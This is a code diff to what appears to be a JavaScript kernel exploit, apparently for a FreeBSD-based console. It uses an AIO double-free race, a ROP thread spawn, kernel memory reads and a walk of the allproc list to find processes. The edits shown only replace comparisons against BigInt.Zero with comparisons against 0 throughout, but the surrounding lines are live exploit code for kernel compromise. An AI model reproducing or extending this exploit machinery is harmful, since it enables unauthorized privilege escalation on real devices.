@@ -914,7 +914,7 @@ function spawn_thread(rop_race1_array) {
     write64(thr_new_args.add(0x38), cpid);               // parent_tid (output)
 
     const result = thr_new(thr_new_args, new BigInt(0x68));
-    if (!result.eq(BigInt.Zero)) {
+    if (!result.eq(0)) {
         throw new Error("thr_new failed: " + hex(result));
     }
 
@@ -1230,7 +1230,7 @@ function setup() {
 
         const sockpair = malloc(8);
         ret = socketpair(AF_UNIX, SOCK_STREAM, 0, sockpair);
-        if (!ret.eq(BigInt.Zero)) {
+        if (!ret.eq(0)) {
             return false;
         }
 
@@ -1246,7 +1246,7 @@ function setup() {
 
         const block_id_buf = malloc(4);
         ret = aio_submit_cmd_fun(AIO_CMD_READ, block_reqs, NUM_WORKERS, 3, block_id_buf);
-        if (!ret.eq(BigInt.Zero)) {
+        if (!ret.eq(0)) {
             return false;
         }
 
@@ -1307,7 +1307,7 @@ function double_free_reqs2() {
 
         ret = bind(sd_listen, server_addr, 16);
 
-        if (!ret.eq(BigInt.Zero)) {
+        if (!ret.eq(0)) {
             log("bind failed");
             close(sd_listen);
             return null;
@@ -1316,7 +1316,7 @@ function double_free_reqs2() {
         const addr_len = malloc(4);
         write32(addr_len, 16);
         ret = getsockname(sd_listen, server_addr, addr_len)
-        if (!ret.eq(BigInt.Zero)) {
+        if (!ret.eq(0)) {
             log("getsockname failed");
             close(sd_listen);
             return null;
@@ -1324,7 +1324,7 @@ function double_free_reqs2() {
         log("Bound to port: " + Number(read16(server_addr.add(2))));
 
         ret = listen(sd_listen, 1)
-        if (!ret.eq(BigInt.Zero)) {
+        if (!ret.eq(0)) {
             log("listen failed");
             close(sd_listen);
             return null;
@@ -1344,7 +1344,7 @@ function double_free_reqs2() {
             const sd_client = new_tcp_socket();
 
             ret = connect(sd_client, server_addr, 16);
-            if (!ret.eq(BigInt.Zero)) {
+            if (!ret.eq(0)) {
                 close(sd_client);
                 continue;
             }
@@ -1359,7 +1359,7 @@ function double_free_reqs2() {
             write32(reqs.add(which_req * 0x28 + 0x20), sd_client);
 
             ret = aio_submit_cmd_fun(cmd, reqs, num_reqs, 3, aio_ids);
-            if (!ret.eq(BigInt.Zero)) {
+            if (!ret.eq(0)) {
                 close(sd_client);
                 close(sd_conn);
                 continue;
@@ -1442,7 +1442,7 @@ function verify_reqs2(addr, cmd) {
         return false;
     }
 
-    if (!read64(addr.add(0x40)).eq(BigInt.Zero)) {
+    if (!read64(addr.add(0x40)).eq(0)) {
         return false;
     }
 
@@ -1451,7 +1451,7 @@ function verify_reqs2(addr, cmd) {
             if (read16(addr.add(i + 4)) !== 0xffff) {
                 heap_prefixes.push(Number(read16(addr.add(i + 4))));
             }
-        } else if (i === 0x50 || !read64(addr.add(i)).eq(BigInt.Zero)) {
+        } else if (i === 0x50 || !read64(addr.add(i)).eq(0)) {
             return false;
         }
     }
@@ -1984,7 +1984,7 @@ function find_proc_by_pid(pid) {
 
     const target_pid = Number(pid);
     var proc = kernel.read_qword(kernel.addr.allproc);
-    while (!proc.eq(BigInt.Zero)) {
+    while (!proc.eq(0)) {
         const proc_pid = kernel.read_dword(proc.add(kernel_offset.PROC_PID));
         if (proc_pid === target_pid) {
             return proc;
